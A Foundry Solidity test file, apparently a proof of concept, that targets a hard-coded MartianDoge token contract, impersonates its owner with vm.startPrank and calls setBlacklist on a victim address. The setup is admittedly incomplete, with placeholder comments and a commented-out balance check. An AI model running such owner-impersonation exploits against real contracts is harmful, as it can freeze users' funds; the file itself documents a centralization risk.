// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMartianDoge {
    function owner() external view returns (address);
    function isBlacklist(address account) external view returns (bool);
    function setBlacklist(address account, bool value) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x0Ea9790b1385ce5efAfc273623A013D007e50254;
    address attacker = address(this);
    IMartianDoge target;
    address owner;
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IMartianDoge(TARGET);
        victim = makeAddr("victim");
        owner = target.owner();

        // Precondition: Victim must have tokens
        // Note: Tokens are minted to the victim, not dealt directly from the contract address
        // Assuming the token contract has a minting or transfer function accessible by the owner.
        // For this PoC, we'll assume a simple deal works for setup purposes.
        vm.deal(victim, 1 ether); // Provide gas for transactions if needed
        // The deal function for tokens would be on the token contract itself, not a generic vm.deal.
        // This line is a placeholder for actual token dealing logic.
        // For example: deal(TOKEN_ADDRESS, victim, 1_000_000 * 1e9);

        // Precondition: Victim is not blacklisted
        assertEq(target.isBlacklist(victim), false, "Victim should not be blacklisted initially");
        // We cannot assert the balance without a valid way to deal tokens in setup.
        // assertGt(target.balanceOf(victim), 0, "Victim should have a token balance");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        vm.startPrank(owner);
        target.setBlacklist(victim, true);
        vm.stopPrank();

        // Oracle check: Verify the victim is now on the blacklist
        assertEq(target.isBlacklist(victim), true, "Victim should be blacklisted after exploit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
